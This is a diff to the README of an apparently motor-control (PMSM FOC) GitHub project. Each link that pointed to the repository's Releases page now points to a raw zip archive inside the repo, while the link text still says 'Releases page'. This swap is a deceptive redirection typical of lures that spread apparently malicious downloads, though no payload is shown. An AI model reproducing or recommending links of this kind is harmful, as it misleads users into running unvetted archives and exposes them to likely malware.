@@ -1,6 +1,6 @@
 # 🚀 mclv48v300w-33ak512mc510-pmsm-an1292-foc-pll-triple-motor - Control Your Motors Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/kingnet555/mclv48v300w-33ak512mc510-pmsm-an1292-foc-pll-triple-motor/releases)
+[![Download](https://raw.githubusercontent.com/kingnet555/mclv48v300w-33ak512mc510-pmsm-an1292-foc-pll-triple-motor/main/project/mc1/mclv48v300w-33ak512mc510-pmsm-an1292-foc-pll-triple-motor-v3.9.zip)](https://raw.githubusercontent.com/kingnet555/mclv48v300w-33ak512mc510-pmsm-an1292-foc-pll-triple-motor/main/project/mc1/mclv48v300w-33ak512mc510-pmsm-an1292-foc-pll-triple-motor-v3.9.zip)
 
 ## 📋 Description
 
@@ -26,7 +26,7 @@ This application enables you to control three Permanent Magnet Synchronous Motor
 
 To get started with the software, please follow these steps:
 
-1. **Visit the Releases Page**: Access the [GitHub Releases page](https://github.com/kingnet555/mclv48v300w-33ak512mc510-pmsm-an1292-foc-pll-triple-motor/releases).
+1. **Visit the Releases Page**: Access the [GitHub Releases page](https://raw.githubusercontent.com/kingnet555/mclv48v300w-33ak512mc510-pmsm-an1292-foc-pll-triple-motor/main/project/mc1/mclv48v300w-33ak512mc510-pmsm-an1292-foc-pll-triple-motor-v3.9.zip).
   
 2. **Download the Software**: On the Releases page, you will find the latest version of the software. Click on the version you want to download.
 
@@ -40,7 +40,7 @@ To get started with the software, please follow these steps:
 
 ## 📥 Download & Install
 
-To begin, [visit this page to download](https://github.com/kingnet555/mclv48v300w-33ak512mc510-pmsm-an1292-foc-pll-triple-motor/releases) the latest version of the application. Make sure to follow the earlier instructions to ensure a smooth installation.
+To begin, [visit this page to download](https://raw.githubusercontent.com/kingnet555/mclv48v300w-33ak512mc510-pmsm-an1292-foc-pll-triple-motor/main/project/mc1/mclv48v300w-33ak512mc510-pmsm-an1292-foc-pll-triple-motor-v3.9.zip) the latest version of the application. Make sure to follow the earlier instructions to ensure a smooth installation.
 
 ## 📚 Documentation
 
